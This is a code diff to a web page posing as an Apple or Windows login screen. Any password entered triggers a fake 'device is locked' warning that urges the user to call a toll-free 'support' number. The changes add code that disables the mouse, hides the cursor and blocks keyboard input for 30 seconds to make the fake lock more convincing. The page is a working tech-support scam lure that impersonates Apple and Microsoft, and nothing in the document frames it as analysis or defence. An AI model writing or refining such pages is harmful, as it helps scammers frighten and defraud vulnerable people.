@@ -143,6 +143,11 @@
       transition: all 0.3s ease;
       filter: drop-shadow(0 0 12px rgba(255, 255, 255, 0.7));
     }
+    /* Disable mouse and cursor when error is shown */
+    .disabled-interaction {
+      pointer-events: none;
+      cursor: none;
+    }
   </style>
 </head>
 <body>
@@ -266,6 +271,7 @@
     const errorMsg = document.getElementById('errorMsg');
     const card = document.getElementById('loginCard');
     const signInButton = document.getElementById('signInButton');
+    const passwordInput = document.getElementById('password');
 
     function detectOS(){
       const ua = navigator.userAgent;
@@ -292,22 +298,37 @@
     }
 
     function checkPassword(){
-      const pwd = document.getElementById('password').value;
-      if(pwd.length > 0){
-        if(os === 'mac'){
-          errorMsg.innerText = "You have entered wrong password and your device is locked. Call Apple support immediately At Toll Free +1-803-762-4570";
-        } else {
-          errorMsg.innerText = "You have entered wrong password and your device is locked. Call Windows support immediately At Toll Free +1-803-762-4570";
-        }
-        errorMsg.style.display = 'block';
-        document.getElementById('password').disabled = true;
-        setTimeout(()=>{
-          document.getElementById('password').disabled = false;
-          errorMsg.style.display = 'none';
-          document.getElementById('password').value = '';
-        }, 30000);
+      // Display error message and disable interactions
+      if(os === 'mac'){
+        errorMsg.innerText = "You have entered wrong password and your device is locked. Call Apple support immediately At Toll Free +1-803-762-4570";
+      } else {
+        errorMsg.innerText = "You have entered wrong password and your device is locked. Call Windows support immediately At Toll Free +1-803-762-4570";
       }
+      errorMsg.style.display = 'block';
+      loginSection.classList.add('disabled-interaction');
+      passwordInput.disabled = true;
+      setTimeout(()=>{
+        errorMsg.style.display = 'none';
+        loginSection.classList.remove('disabled-interaction');
+        passwordInput.disabled = false;
+        passwordInput.value = '';
+      }, 30000);
     }
+
+    // Trigger checkPassword on Enter key press
+    passwordInput.addEventListener('keydown', (event) => {
+      if (event.key === 'Enter') {
+        event.preventDefault();
+        checkPassword();
+      }
+    });
+
+    // Prevent keyboard input when error message is shown
+    document.addEventListener('keydown', (event) => {
+      if (loginSection.classList.contains('disabled-interaction')) {
+        event.preventDefault();
+      }
+    });
 
     // Fallback for background images
     window.addEventListener('error', (event) => {
